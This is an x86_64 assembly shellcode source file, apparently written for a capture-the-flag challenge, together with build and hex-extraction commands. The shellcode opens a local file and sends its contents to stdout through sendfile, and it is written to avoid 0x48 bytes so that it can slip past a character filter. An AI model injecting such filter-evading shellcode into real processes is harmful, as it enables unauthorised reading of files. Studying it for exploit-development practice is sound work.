#
# read-no-H.s - Linux/x86_64 sendfile without 0x48 bytes
# Copyright (c) 2025 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# Shellcode inspired by a challenge that shall remain unnamed to prevent 
# spoilers.
#
# Useful commands:
# $ gcc -nostdlib -static shellcode.s -o shellcode-elf
# $ objdump -M intel -d shellcode-elf
# $ strace ./shellcode-elf
# $ objcopy --dump-section .text=shellcode-raw shellcode-elf
# $ xxd -p shellcode-raw | tr -d '\n' | sed 's/../\\x&/g'
#

.intel_syntax noprefix
.global _start

.text
_start:
    # open(".//x", O_RDONLY)
    push 0x782f2f2e
    push rsp
    pop rdi             # ".//x"

    push 1
    pop rsi
    dec esi             # 0 (O_RDONLY)

    mov al, 2           # open
    syscall

    # sendfile(1, fd, NULL, 1000)
    push 1
    pop rdi             # 1

    push rax
    pop rsi             # fd

    push 1
    pop rdx
    dec edx             # 0 (NULL)

    mov r10w, 1000      # 1000

    mov al, 40          # sendfile
    syscall

    # exit(...)
    mov al, 60          # exit
    syscall
